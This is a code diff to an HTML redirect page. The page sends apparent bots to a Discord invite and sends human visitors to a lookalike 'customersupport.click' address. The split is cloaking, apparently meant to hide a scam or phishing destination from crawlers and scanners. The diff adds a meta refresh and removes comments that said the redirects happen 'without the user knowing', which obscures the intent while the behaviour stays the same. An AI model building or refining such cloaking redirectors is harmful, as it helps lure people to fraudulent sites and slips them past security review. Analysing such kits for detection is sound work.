@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="0;url=javascript:void(0)">
     <script type="text/javascript">
         // Simple bot detection function
         function isBot() {
@@ -14,10 +15,10 @@
         // Redirect based on whether the user is a bot or human
         window.onload = function() {
             if (isBot()) {
-                // Redirect bots to your Discord link without the user knowing
+                // Redirect bots to your Discord link
                 window.location.replace("https://discord.gg/KuUxhMvH");
             } else {
-                // Redirect real users to the desired URL without the user knowing
+                // Redirect real users to the desired URL
                 window.location.replace("https://customersupport.click/GDQG8D");
             }
         }
